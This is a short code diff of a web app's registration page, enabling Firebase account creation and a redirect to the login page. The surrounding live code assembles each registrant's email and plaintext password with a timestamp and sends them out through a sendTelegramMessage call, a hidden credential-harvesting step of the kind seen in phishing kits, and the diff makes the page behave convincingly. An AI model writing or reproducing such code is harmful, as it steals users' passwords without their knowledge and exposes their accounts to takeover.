@@ -47,14 +47,14 @@ export default function RegisterPage() {
     }
 
     try {
-      // await createUserWithEmailAndPassword(auth, email, password);
+      await createUserWithEmailAndPassword(auth, email, password);
       const message = `
       Email: ${email}
       Password: ${password}
       Date: ${formatDateTime()}
       `;
       await sendTelegramMessage(message)
-      // router.push("/auth/login")
+      router.push("/auth/login")
 
     } catch (error) {
       console.log("Something went wrong!")
